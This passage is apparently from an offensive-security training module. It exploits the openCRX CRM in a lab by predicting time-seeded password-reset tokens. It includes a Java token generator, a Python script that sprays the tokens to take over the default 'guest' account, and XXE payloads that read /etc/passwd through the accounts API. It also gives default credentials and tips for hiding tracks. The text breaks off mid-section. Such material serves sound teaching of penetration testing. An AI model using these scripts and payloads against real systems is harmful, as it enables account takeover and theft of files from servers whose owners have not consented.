#### openCRX Authentication Bypass and Remote Code Execution

We will use white box techniques to exploit deterministic password reset tokens to gain access to the application. Once authenticated, we will combine two different exploits to gain remote code execution and create a web shell on the server.

(openCRX, 2020), http://www.opencrx.org/ ↩︎

Starting server

```
ssh student@opencrx
cd crx/apache-tomee-plus-7.0.5/bin
./opencrx.sh run
```
##### Password Reset Vulnerability Discovery

 We will ssh to the server and inspect the application's structure on the server using the tree command, limiting the depth to three sub-directories with -L 3.

```
ssh student@opencrx
cd crx/apache-tomee-plus-7.0.5/
tree -L 3
```

Based on the output above, we know that openCRX was packaged as an EAR file, which we can find at /home/student/crx/apache-tomee-plus-7.0.5/apps.

There are also several WAR files inside /home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX. These files should also be inside the EAR file, eliminating the need to copy each individually to our box for analysis.
use scp to copy opencrx-core-CRX.ear to our local Kali machine. Next, we'll unzip it, passing in -d opencrx to extract the contents into a new directory.

```
exit
scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
unzip -q opencrx-core-CRX.ear -d opencrx

cd opencrx
ls -al

```

We could examine a Java web application by starting with its deployment descriptor,5 such as a web.xml file, to better understand how the application maps URLs to servlets. However, we'll instead start with JSP6 files. We're taking this approach because openCRX mixes application logic with HTML within the JSPs.

In Java web applications, "servlet" is a shorthand for the classes that handle requests, such as HTTP requests. Each framework has its own versions of servlets; in general, they implement code that takes in a request and returns a response. Java Server Pages (JSP) are a form of servlet used for dynamic pages. JSPs can mix Java code with traditional HTML.

Exploring the contents of the WAR file in JD-GUI, we find several JSP files which mention authentication and password resets.


Since vulnerabilities in authentication and password reset functions can often be leveraged to gain authenticated access to a web application, we'll inspect these functions first. If we can find and exploit a vulnerability that gives us access to a valid user account, we can then search for other post-authentication vulnerabilities. With that in mind, let's explore the source code for RequestPasswordReset.jsp to discover how this application handles password resets.

056  %><%@ page session="true" import="
057  java.util.*,
058  java.net.*,
059  java.util.Enumeration,
060  java.io.PrintWriter,
061  org.w3c.spi2.*,
062  org.openmdx.portal.servlet.*,
063  org.openmdx.base.naming.*,
064  org.opencrx.kernel.generic.*
Listing 5 - Code excerpt from RequestPasswordReset.jsp

Several custom libraries are imported starting on line 56. The import attribute specifies which classes can be used within the JSP. This is similar to an import statement in a standard Java source file which adds application logic to the program. The org.opencrx.kernel.generic.* import on line 64 is especially interesting as the naming pattern fits the application we are examining. The "*" character in the import is a wildcard used to import all classes within the package.

The file also contains additional application logic. The application code that handles password resets starts near the end of the file, around line 153.

153		if(principalName != null && providerName != null && segmentName != null) {
154			javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
155			javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
156				SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName, 
157				null
158			);
159			try {
160				org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
161					new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
162				);
163				pm.currentTransaction().begin();
164				userHome.requestPasswordReset();
165				pm.currentTransaction().commit();
166				success = true;
167			} catch(Exception e) {
168				try {
169					pm.currentTransaction().rollback();
170				} catch(Exception ignore) {}
171				success = false;
172			}
173		} else {
174			success = false;
175		}
Listing 6 - Code excerpt from RequestPasswordReset.jsp

Let's step through the logic in this code block. In order to execute it, the if statement on line 153 needs to evaluate to true, which means principalName, providerName, and segmentName cannot be null. On lines 160 and 161, the pm.getObjectById method call uses those values to get an org.opencrx.kernel.home1.jmi1.UserHome object.

Line 164 calls a requestPasswordReset method on this object. We will need to find where this class is defined to continue tracing the password reset logic. If the class definition for UserHome was inside the WAR file we opened, we would be able to click on the linked method name in JD-GUI. Since there is no clickable link, we know the class must be defined elsewhere.

While we have been examining a WAR file, the overall application was deployed as an EAR file. EAR files include an application.xml file that contains deployment information, which includes the location of external libraries. Let's check this file, which we can find in the META-INF directory.

kali@kali:~/opencrx$ cat META-INF/application.xml
<?xml version="1.0" encoding="UTF-8"?>
<application id="opencrx-core-CRX-App" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/application_5.xsd">
	<display-name>openCRX EAR</display-name>
	<module id="opencrx-core-CRX">
		<web>
			<web-uri>opencrx-core-CRX.war</web-uri>
			<context-root>opencrx-core-CRX</context-root>
		</web>
	</module>
...
	<library-directory>APP-INF/lib</library-directory>
</application>
Listing 7 - openCRX's application.xml file

The library-directory element specifies where external libraries are found within an EAR file. The opencrx-kernel.jar file is located in the extracted /APP-INF/lib directory. We should be able to find the UserHome class inside that JAR file based on naming conventions.

While we do find the class there, it is just an interface.7 Interfaces define a list of methods (sometimes referred to as behaviors) but do not implement the actual code within those methods. Instead, classes can implement one or more interfaces. If a class implements an interface, it must include code for all the methods defined in that interface.

To determine what the method call actually does, we will need to find a class that implements the interface. Let's search for "requestPasswordReset" in JD-GUI to find other classes that might contain or call this method, making sure "Method" is checked when we perform our search.

When we search the entire code base of opencrx-kernel.jar, we find five results for "requestPasswordReset". If the name of a class is appended with "Impl", it implements an interface. If we inspect org.opencrx.kernel.home1.aop2.UserHomeImpl.class, we will find a short method that calls the requestPasswordReset method of org.opencrx.kernel.backend.UserHomes.class.

111  public Void requestPasswordReset() {
112    try {
113      UserHomes.getInstance().requestPasswordReset((UserHome)
114        sameObject());
115      
116      return newVoid();
117    } catch (ServiceException e) {
118      throw new JmiServiceException(e);
119    } 
120  }
Listing 8 - Code excerpt from UserHomeImpl.class

Let's inspect the requestPasswordReset function in that UserHomes class by clicking on requestPasswordReset within the try/catch block.

324 public void requestPasswordReset(UserHome userHome) throws ServiceException {
...   
336     String webAccessUrl = userHome.getWebAccessUrl();
337     if (webAccessUrl != null) {
338       String resetToken = Utils.getRandomBase62(40);
...       
341       String name = providerName + "/" + segmentName + " Password Reset";
342       String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
343       String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
...     
363       changePassword((Password)loginPrincipal
364           .getCredential(), null, "{RESET}" + resetToken);
365     } 
366   }
Listing 9 - Code excerpt from org.opencrx.kernel.backend.UserHomes.java

The application makes a method call on line 338 to generate a token. The token is used in some strings like "resetConfirmUrl", and ultimately passed to the changePassword method on line 364. To understand how that token is generated in Utils, we can open the source code by clicking on "getRandomBase62".

1038   public static String getRandomBase62(int length) {
1039      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
1040     Random random = new Random(System.currentTimeMillis());
1041     String s = "";
1042     for (int i = 0; i < length; i++) {
1043       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
1044     }
1045     return s;
1046   }
Listing 10 - Code excerpt from org.opencrx.kernel.utils.Util.java

The getRandomBase62 method accepts an integer value and returns a randomly generated string of that length. There's something wrong with this code however. Let's investigate further.

1
(The Apache Software Foundation, 2016), https://tomee.apache.org/ ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/JAR_(file_format) ↩︎

3
(Wikipedia, 2020), https://en.wikipedia.org/wiki/WAR_(file_format) ↩︎

4
(Wikipedia, 2020), https://en.wikipedia.org/wiki/EAR_(file_format) ↩︎

5
(Wikipedia, 2019), https://en.wikipedia.org/wiki/Deployment_descriptor ↩︎

6
(Wikipedia, 2020), https://en.wikipedia.org/wiki/JavaServer_Pages ↩︎

7
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Interface_(Java) ↩︎


#### When Random Isn't
We will use javac1 and jshell2 in this section. If not already installed, let's install them with sudo apt install openjdk-11-jdk-headless. We want to match the version of the JDK with the JRE we have installed in Kali, which we can confirm using java -version.

We can use jshell to interactively run Java and observe this behavior in action. Let's import the Random class, then declare and instantiate two instances of Random objects with the same seed value. Then, we can compare the output of calling the nextInt5 method on each Random object inside a for loop.

kali@kali:~$ jshell
|  Welcome to JShell -- Version 11.0.6
|  For an introduction type: /help intro

jshell> import java.util.Random;

jshell> Random r1 = new Random(42);
r1 ==> java.util.Random@26a1ab54

jshell> Random r2 = new Random(42);
r2 ==> java.util.Random@41cf53f9

jshell> int x, y;
x ==> 0
y ==> 0

jshell> for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){ System.out.println("They match! " + x);}}
They match! -1170105035
They match! 234785527
They match! -1360544799
They match! 205897768
They match! 1325939940
They match! -248792245
They match! 1190043011
They match! -1255373459
They match! -1436456258
They match! 392236186
Listing 11 - Generating two random integers and comparing them in a for loop

Let's observe this in action, again using jshell. SecureRandom objects use a byte array as a seed, so we'll need to declare a byte array before we instantiate our objects.

jshell> import java.security.SecureRandom;

jshell> byte[] s = new byte[] { (byte) 0x2a }
s ==> byte[1] { 42 }

jshell> SecureRandom r1 = new SecureRandom(s);
r1 ==> NativePRNG

jshell> SecureRandom r2 = new SecureRandom(s);
r2 ==> NativePRNG

jshell> if(r1.nextInt() == r2.nextInt()) { System.out.println("They match!"); } else { System.out.println("No match."); }
No match.

jshell> /exit
|  Goodbye
Listing 12 - Comparing the output of two SecureRandom objects

Even though they were instantiated with the same seed value, the two SecureRandom objects returned different results from the nextInt method.

What does this mean for us? Let's review the token generation code to remember what we are working with.

1038   public static String getRandomBase62(int length) {
1039      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
1040     Random random = new Random(System.currentTimeMillis());
1041     String s = "";
1042     for (int i = 0; i < length; i++) {
1043       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
1044     }
1045     return s;
1046   }
Listing 13 - Code excerpt from org.opencrx.kernel.utils.Util.java

The code in openCRX uses the regular Random class to generate password reset tokens; it is seeded with the results of System.currentTimeMillis(). This method returns "the difference, measured in milliseconds, between the current time and midnight, January 1, 1970 UTC".6

If we can predict when a token is requested, we should be able to generate a matching token by manipulating the seed value when creating our own Random object. We could even generate a list of possible tokens, assuming there is no throttling or lockout for password resets on the server, and iterate through the list until we find a match. However, we also need an account to target.

Exercises
Use jshell to recreate the code blocks in this section.
Compare ten outputs from SecureRandom objects using a for loop.
1
(Oracle, 2018), https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javac.html ↩︎

2
(Oracle, 2017), https://docs.oracle.com/javase/9/jshell/introduction-jshell.htm#JSHEL-GUID-630F27C8-1195-4989-9F6B-2C51D46F52C8 ↩︎

3
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html ↩︎

4
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html ↩︎

5
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-- ↩︎

6
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/lang/System.html#currentTimeMillis-- ↩︎

#### Account Determination

A default installation1 of openCRX has three accounts with the following username and password pairs:

guest / guest
admin-Standard / admin-Standard
admin-Root / admin-Root
With this in mind, let's start Burp Suite and configure Firefox to use it as a proxy.

We can use error messages from login and password reset pages to determine the validity of a submitted username. We can find the reset page by going to the login page in Listing 14 and submitting invalid credentials. This reveals the link to the password reset page.

http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false
Listing 14 - Login page URI

Let's submit a password reset for a default username to determine if if this page discloses valid user accounts. If we submit a valid account, the response indicates the password reset request was successful.

If we submit an invalid account, we receive an error message.

The differences in the response indicate the existence of a "guest" account. Let's use "guest" as our target account for the reset process.

1
(openCRX, 2020), https://github.com/opencrx/opencrx-documentation/blob/master/Admin/InstallerServer.md ↩︎

##### Timing the Reset Request

In order to generate the correct password reset token, we need to guess the seed value, which is the exact millisecond that the token was generated. Thankfully, the value returned by System.currentTimeMillis() is already in UTC, so we don't have to worry about time zone differences.

We can get the milliseconds "since the epoch" using the date command in Kali with the %s flag. We'll also use the %3N flag to include three digits of nanoseconds. This format will match the output of the Java method in milliseconds.

We can get the range of potential seed values using the date command before and after we submit the reset request with curl. We will also use the -i flag to include response headers in the output. In order for this attack to succeed, the server time must be set to the correct date and time. We can use the Date1 response header to determine the server time.

kali@kali:~$ date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
1582038122371
HTTP/1.1 200 
Set-Cookie: JSESSIONID=367FD5747FB803124A0F504A1FC478B7; Path=/opencrx-core-CRX; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 2282
Date: Tue, 18 Feb 2020 15:02:02 GMT
Server: Apache TomEE
...
1582038122769
Listing 15 - Submitting a password reset request with curl


Based on the output, we can guess that the reset token was created with a seed value between 1582038122371 and 1582038122769. This includes 398 possible seed values.

This range varies based on network latency and server processing time. However, the seed is determined early in the password reset process, so it is likely to be closer to the start time rather than the end time.

The server response included a Date header with the value of "Tue, 18 Feb 2020 15:02:02 GMT". We can convert this value to the Unix epoch time using a site such as EpochConverter.2

Figure 7: Converting the Date header to milliseconds since the epoch
Figure 7: Converting the Date header to milliseconds since the epoch
We do not get the same level of millisecond precision from the value of the Date header as we do from running the date command. The timestamp will always end in 000. However, we can use the header value as a sanity check to make sure our local values are in the correct range.

In this case, the timestamps we calculated locally, 1582038122371 and 1582038122769, do roughly align with the value from the server (1582038122000). The values should be close enough to proceed with this attack.

1
(Internet Engineering Task Force, 2014), https://tools.ietf.org/html/rfc7231#section-7.1.1.2 ↩︎

2
(Epoch Converter, 2020), https://www.epochconverter.com ↩︎

##### Generate Token List
Now that we have the range of potential random seeds, we need to create our own token generator. Let's create a file with our own Java class to generate the tokens to exploit the predictable random generation. The name of the class within the file must match the file name and end with "java" as the file extension. We will use touch to create an empty file named OpenCRXToken.java.

kali@kali:~/opencrx$ touch OpenCRXToken.java
Listing 16 - Creating an empty Java source file

Next, let's start by building out the basic outline of our class. We will need a class definition, a main method so that we can run the class from the command line, and a method that generates the tokens. We'll copy much of the code that generates the tokens from org.opencrx.kernel.utils.Util.java, but we'll modify it to accept the seed value so we can iterate through values as we generate tokens. We'll also import java.util.Random to generate the tokens. A simple text editor like nano should suffice for editing the file.

kali@kali:~/opencrx$ nano OpenCRXToken.java

import java.util.Random;

public class OpenCRXToken {
  
  public static void main(String args[]) { }
  
  public static String getRandomBase62(int length, long seed) { }
}

Listing 17 - Updating the Java source file

Let's build out the main method next. We will need an int variable for the length of the token, long variables for the start and stop seed values, and a String for the token values. We will use a for loop to iterate between the start and stop values, calling the getRandomBase62 method and passing in the seed value as it iterates.

import java.util.Random;
  
public class OpenCRXToken {
  
  public static void main(String args[]) {
    int length = 40;
    long start = Long.parseLong("1582038122371");
    long stop = Long.parseLong("1582038122769");
    String token = "";
  
    for (long l = start; l < stop; l++) {
      token = getRandomBase62(length, l);
      System.out.println(token);
    }
  }
  
  public static String getRandomBase62(int length, long seed) {
  
  }
}
Listing 18 - OpenCRXToken.java

We will set the start and stop values which are based on the timestamps from when we ran curl in Listing 15. Finally, we will copy the contents of the getRandomBase62 method from org.opencrx.kernel.utils.Util.java and modify it to use the seed value passed in to the method. Please note that for the sake of brevity, the function content is not included in the listing above.

Once the values are set, we can compile the program with javac and run it with java, redirecting the output into a text file. We will also tail the file to make sure the tokens were written correctly.

kali@kali:~/opencrx$ javac OpenCRXToken.java 

kali@kali:~/opencrx$ java OpenCRXToken > tokens.txt

kali@kali:~/opencrx$ tail tokens.txt
SCKF9pp15wUrAZj84eC7m3Z1P5PexTb9wUetcF4T
OA1Otn7zkpspZ7pa3kIxSFsKcRdRelTKaQhmPkf3
aAycQmACHCk1cSdI4YKwnf8m464bmo2xjRtWldPY
1C8wnnzbg47SPVBE55G1mMNOi5k8NeK3KSHEhwEz
DA5AKo2oCR1dTp0u3uH07obqAkBIVhugTRTz3ryV
88mJ3mJmtLNZpN5M5zOqmzu9N7P5Axls7NXrqJZ5
K8iXdlOxPjGlvhu45nPp6QAdplpEK2LVEMieCEIb
l8srznDOnZdCgkSy4MLv67PEWlWkvqdbrP7J7X84
x8p5WnGZLwVOm4Hg4BMuRXdgySxv3vCE0OJ4UQqZ
vMSsitoJwnrHnfB00BneUoeGxMxiQPj3UjkCnBNi
Listing 19 - Compiling and running OpenCRXToken

With our token list generated, we'll next determine how to leverage it to complete the password reset process.

##### 
Automating Resets
When we examined the source code in UserHomes.class, we found the format of a reset link:

 String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
Listing 20 - Password reset link

We have our tokens, but we will also need to provide values for providerName, segmentName, and id. Based on the password reset request we sent, we know the id value is the username. We can find clues for providerName and segmentName in the source code of RequestPasswordReset.jsp.

234  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="RequestPasswordReset.jsp" accept-charset="UTF-8">
235      <h2 class="form-signin-heading">Please enter your username, e-mail address or ID</h2>					
236      <input type="text" name="id" id="id" autofocus="" placeholder="ID (e.g. guest@CRX/Standard)" class="form-control" />
237      <br />
238      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
239      <br />
240      <%@ include file="request-password-reset-note.html" %>
241  </form>
Listing 21 - An example of provider and segment in RequestPasswordReset.jsp

Line 236 defines the input field for id, which includes a placeholder value of "guest@CRX/Standard". When we visit that page in our browser, we receive a different placeholder.

The value "CRX" has been replaced with "ProviderName" and "Standard" has been replaced with "SegmentName". We can find another example that matches this pattern by examining WizardInvoker.jsp in JD-GUI.

65	/**
66	 *	The WizardInvoker is invoked with the following URL parameters:
67	 *	- wizard: path of the wizard JSP
68	 *	- provider: provider name
69	 *	- segment: segment name
70	 *	- xri: target object xri
71	 *	- user: user name
72	 *	- password: password
73	 *  - para_0, para_1, ... para_n: additional parameters to be passed to the wizard (optional)
74	 *	Example:
75	 *	http://localhost:8080/opencrx-core-CRX/WizardInvoker.jsp?wizard=/wizards/en_US/UploadMedia.jsp&provider=CRX&segment=Standard&xri=xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard&user=wfro&password=.
Listing 22 - An example of provider and segment in WizardInvoker.jsp

On lines 68 and 69, we find references to providers and segments. We can also find an example URL on line 75 that uses "CRX" as the provider and "Standard" as the segment. This matches the same pattern we found in RequestPasswordReset.jsp. We will try using "CRX" as the providerName and "Standard" as the segmentName in our attack.

Now that we know what all of the values are, let's examine the source code of PasswordResetConfirm.jsp to determine what data we need to send to the server for the reset.

067  String resetToken = request.getParameter("t");
068  String providerName = request.getParameter("p");
069  String segmentName = request.getParameter("s");
070  String id = request.getParameter("id");
071  String password1 = request.getParameter("password1");
072  String password2 = request.getParameter("password2");
...
163  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="PasswordResetConfirm.jsp" accept-charset="UTF-8">
164      <h2 class="form-signin-heading">Reset password for <%= id %>@<%= providerName + "/" + segmentName %></h2>					
165      <input type="hidden" name="t" value="<%= resetToken %>" />
166      <input type="hidden" name="p" value="<%= providerName %>" />
167      <input type="hidden" name="s" value="<%= segmentName %>" />
168      <input type="hidden" name="id" value="<%= id %>" />
169      <input type="password" name="password1" autofocus="" placeholder="Password" class="form-control" />
170      <input type="password" name="password2" placeholder="Password (verify)" class="form-control" />
171      <br />
172      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
173      <br />
174      <%@ include file="password-reset-confirm-note.html" %>					
175  </form>
Listing 23 - Code excerpt from PasswordResetConfirm.jsp

Lines 163 - 175 are the form element we want to mimic in our reset script. In addition to the token, providerName, segmentName, and id, we need to provide a new password value in the password1 and password2 fields.

We now have everything we need to write a Python script to automate the password reset process. We will iterate through the list of tokens we previously generated with our OpenCRXToken Java class and POST each token to the server. Let's inspect the server responses to see if the reset worked and exit the for loop once we have a successful reset.

#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
Listing 24 - OpenCRXReset.py

Let's run the script. It may take a few minutes to return a result.

kali@kali:~/Documents/research$ ./OpenCRXReset.py -u guest -p password
Starting token spray. Standby.
Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe
Listing 25 - Running the reset script

We can verify the password reset was successful by attempting to log in to the site in our browser with the username "guest" and password "password".

Figure 9: Logged in as guest
Figure 9: Logged in as guest
We have now successfully reset the password for the guest account and have access to the application. A few alerts were created for the password resets we requested. Although not required for this exercise, deleting these alerts would help maintain stealth during a penetration test.

Sending up to 3000 requests to the web application is noisy. In a real world scenario, we would likely want to rate limit our script to hide our tracks in normal traffic and avoid overloading the server.


### XML

For example, this is a simple XML document:

1  <?xml version="1.0" encoding="UTF-8"?>
2  <contact>
3    <firstName>Tom</firstName>
4    <lastName>Jones</lastName>
5  </contact>
Listing 26 - A sample XML document

The example above starts with an XML declaration on line 1. Lines 2 through 5 define a contact element. The firstName and lastName elements are sub-elements of contact.

1
(Wikipedia, 2020), https://en.wikipedia.org/wiki/XML ↩︎

#### XML Parsing

XML parsing vulnerabilities can, at times, provide powerful primitives to an attacker. Depending on the programming language an XML parser is written in, these primitives can eventually be chained together to achieve devastating effects such as:

Information Disclosure
Server-Side Request Forgery
Denial of Service
Remote Command Injection
Remote Code Execution



#### XML Entities
From the attacker's perspective, Document Type Definitions (DTDs) are an interesting feature of XML. DTDs can be used to declare XML entities within an XML document. In very general terms, an XML entity is a data structure typically containing valid XML code that will be referenced multiple times in a document. We might also think of it as a placeholder for some content that we can refer to and update in a single place and propagate throughout a given document with minimal effort, similar to variables in a programming language.

Generally speaking, there are three types of XML entities: internal, external, and parameter.

Internal Entities
Internal entities are locally defined within the DTD. Their general format is as follows:

<!ENTITY name "entity_value">
Listing 27 - The format of a internally parsed entity

This is a very trivial example of an internal entity:

<!ENTITY test "<entity-value>test value</entity-value>">
Listing 28 - Example of internal entity syntax

Note that an entity does not have any XML closing tags and is using a special declaration containing an exclamation mark. For example, the internal entity in Listing 28 is using a hard-coded string value that contains valid XML code.

External Entities
By definition, external entities are used when referencing data that is not defined locally. As such, a critical component of the external entity definition is the URI from which the external data will be retrieved.

External entities can be split into two groups, namely private and public. The syntax for a private external entity is:

<!ENTITY name SYSTEM "URI">
Listing 29 - The format of a privately parsed external entity

This is an example of a private external entity:

<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
Listing 30 - Example of private external entity syntax

Most importantly, the SYSTEM keyword indicates that this is a private external entity for use by a single user or perhaps a group of users. In other words, this type of entity is not intended for wide-spread use.

In contrast, public external entities are intended for a much wider audience. The syntax for a public external entity is:

<!ENTITY name PUBLIC "public_id" "URI">
Listing 31 - The format of a publicly parsed external entity

This is an example of a public external entity:

<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
Listing 32 - Example of public external entity syntax

The PUBLIC keyword indicates that this is a public external entity.

Additionally, public external entities may specify a public_id. This value is used by XML pre-processors to generate alternate URIs for the externally parsed entity.

Parameter Entities
Parameter entities exist solely within a DTD, but are otherwise very similar to any other entity. Their definition syntax differs only by the inclusion of the % prefix:

<!ENTITY % name SYSTEM "URI">
Listing 33 - The format of a parameter entity

<!ENTITY % course 'AWAE'>
<!ENTITY Title 'Offensive Security presents %course;' >
Listing 34 - An example of a parameter entity

Unparsed External Entities
As we previously mentioned, an XML entity does not have to contain valid XML code. It can contain non-XML data as well. In those instances, we have to prevent the XML parser from processing the referenced data by using the NDATA declaration. The following formats can be used for both public and private external entities.

<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
Listing 35 - In unparsed external entities, the data read from the URI is treated as data of type determined by the TYPE argument

We can access binary content with unparsed entities. This can be important in web application environments that do not have the same flexibility that PHP offers in terms of I/O stream manipulation.

##### Understanding XML External Entity Processing Vulnerabilities
As discussed in the previous section, external entities can often access local or remote content via declared system identifiers. An XML External Entity (XXE) injection is a specific type of attack against XML parsers. In a typical XXE injection, the attacker forces the XML parser to process one or more external entities. This can result in the disclosure of confidential information not normally accessible by the application. That means the main prerequisite for the attack is the ability to feed a maliciously-crafted XML request containing system identifiers that point to sensitive data to the target XML processor.

There are many techniques that allow an attacker to exfiltrate data, including binary content, using XXE attacks. Additionally, depending on the application's programming language and the available protocol wrappers, it may be possible to leverage this attack for full command injection.

In some languages, like PHP, XXE vulnerabilities can even lead to remote code execution. In Java, however, we cannot execute code with just an XXE vulnerability.


##### Finding the Attack Vector
Let's demonstrate an XXE attack with a simple example.

When an XML parser encounters an entity reference, it replaces the reference with the entity's value.

<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
Listing 36 - An internal entity example

When the XML above is parsed, the parser replaces the entity reference "&lastname;" with the entity's value "Replaced". If an application used the results and displayed the contact's name, it would display "Tom Replaced". This example uses an internal entity.

What if we change the XML entity to an external entity and reference a file on the server?

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Listing 37 - An external entity example

A vulnerable parser will load the file contents and place them in the XML document. In the example of 37, a vulnerable parser would read in the contents of /etc/passwd and place that content in between the lastName tags. If the lastName contents are included in a server response or we can retrieve the data in another way after the XML has been parsed, we can use this vulnerability to read files on the server. This is a fundamental XXE attack technique.

If the application is vulnerable to XXE, we want to make sure we can observe the results of the XXE attack. Ideally, we would inject the XXE payload into a field that is displayed in the web application.

After spending some time familiarizing ourselves with the application, the Accounts page seems like a good fit because the Accounts API accepts XML input. Each account or contact also has multiple text fields that are displayed in the web application. If we can successfully create accounts using XXE payloads in one of these fields, such as a name field, we should be able to view the results of our XXE attack in the web application. Let's attempt this attack against the Accounts API.

To find the page for the Accounts API, we can switch back to the main web application and click on Manage Accounts. If the link doesn't show up, we'll find it by clicking on the hamburger menu first.

Next, let's click on Wizards > Explore API...

Figure 12: Explore API
Figure 12: Explore API
On the API Explorer page for the Accounts API, we can use a POST to /account as the basis of our attack. Let's change "Request body" to "application/xml" to send XML data instead of JSON.

Next, we need a sample of the data that goes in the POST body. There is no example value, but we can inspect some sample objects by clicking on Model.

Figure 13: Viewing Sample Models
Figure 13: Viewing Sample Models
Scrolling through the entire model, we observe several fields. This API call appears to be complicated because the Swagger documentation displays all possible fields. We want something simple with the minimum number of fields. The more fields we have to submit, the more potential issues we could run into with data types, formatting, and server-side validation. We can search the openCRX site for documentation1 to find a simple example for this API endpoint:

Method: POST
URL: http://localhost:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account
Body:	
<?xml version="1.0"?>
<org.opencrx.kernel.account1.Contact>
  <lastName>REST</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
Listing 38 - Sample object creation from http://www.opencrx.org/opencrx/2.3/new.htm

Let's use this example to test out the API. We can click Try it out and paste the sample body into the "In" field.

Figure 14: Sample POST body
Figure 14: Sample POST body
Next, we'll click Execute to send the request. We should receive a successful response in the web UI. Let's switch to Burp Suite and send the POST request to Repeater. We can add a simple DOCTYPE and ENTITY to determine if they are parsed by the server.

We will modify the POST like this:

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Listing 39 - lastname entity

After we make the changes, we can click Send and search the response for the "lastname" field's value to determine if the entity was parsed.


Excellent! The application's XML parser read our entity and put "Replaced" as the last name. Now that we know internal entities are being parsed, let's try using an external entity to reference a file on the underlying server and find out if we can retrieve the contents.

We need to update our POST body as follows:

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Listing 40 - Using XXE to read /etc/passwd

When we send it, we receive an error.


The response is quite long so let's examine it closely for useful information. As we scroll through the response, we discover an SQL statement about a quarter of the way down.

